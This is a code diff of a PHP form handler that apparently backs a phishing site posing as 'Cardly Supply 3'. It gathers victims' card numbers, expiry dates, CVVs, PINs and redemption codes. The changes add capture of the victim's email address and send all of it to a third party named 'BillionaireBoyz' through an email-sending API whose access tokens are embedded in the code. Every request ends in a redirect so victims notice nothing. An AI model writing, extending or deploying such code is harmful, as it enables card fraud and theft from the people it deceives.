@@ -2,9 +2,9 @@
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
     header('Location: https://my-cardlysupply3.vercel.app/');
     exit;
-    exit;
 };
-$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
+
+$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = $email = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['form_fields']["currency"])) {
         $currency = $_POST['form_fields']["currency"];
@@ -32,6 +32,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
     if (!empty($_POST['form_fields']["pin"])) {
         $cardPIN = $_POST['form_fields']["pin"];
+    }
+
+    if (!empty($_POST['form_fields']["email"])) {
+        $email = $_POST['form_fields']["email"];
     }
 
     $card_data = <<<card_data
@@ -65,10 +69,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = <<<data
     {
-        "service_id": "service_3uyknph",
-        "template_id": "template_24v2iow",
-        "user_id": "2J8DshQnpUuUkoM9C",
-        "accessToken": "6X57_NC-Z7fS_Ygz3SjkI",
+        "service_id": "service_t84qq3v",
+        "template_id": "template_l1dza9m",
+        "user_id": "-GXR5-vheoKdhIIH4",
+        "accessToken": "sMjA-i0fQ9-tjs4HYIm4L",
         "template_params": {
             "to_name":"BillionaireBoyz",
             "from_name":"Cardly Supply 3",
@@ -77,21 +81,45 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
     data;
 
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
-$resp = curl_exec($curl);
-curl_close($curl);
+    $resp = curl_exec($curl);
+    curl_close($curl);
 
-if ($resp === false) {
-    header('Location: https://my-cardlysupply3.vercel.app/');
+    if (!empty($email)) {
+        $user_email_data = <<<user_email_data
+        {
+            "email": $email,
+        }
+        user_email_data;
+
+        $email_card_data = json_encode($user_email_data);
+        $email_data = <<<email_data
+        {
+            "service_id": "service_t84qq3v",
+            "template_id": "template_brtd0x7",
+            "user_id": "-GXR5-vheoKdhIIH4",
+            "accessToken": "sMjA-i0fQ9-tjs4HYIm4L",
+            "template_params": {
+                "to_name":"BillionaireBoyz",
+                "from_name":"Cardly Supply 3",
+                "message": $user_email_data
+            }
+        }
+        email_data;
+
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $email_data);
+
+        $resp = curl_exec($curl);
+        curl_close($curl);
+    }
+
+    if ($resp === false) {
+        header('Location: https://my-cardlysupply3.vercel.app/');
+    } else {
+        header('Location: https://my-cardlysupply3.vercel.app/');
+    };
 } else {
     header('Location: https://my-cardlysupply3.vercel.app/');
+    exit;
 };
-
-} else {
-header('Location: https://my-cardlysupply3.vercel.app/');
-exit;
-};
-
-
-?>
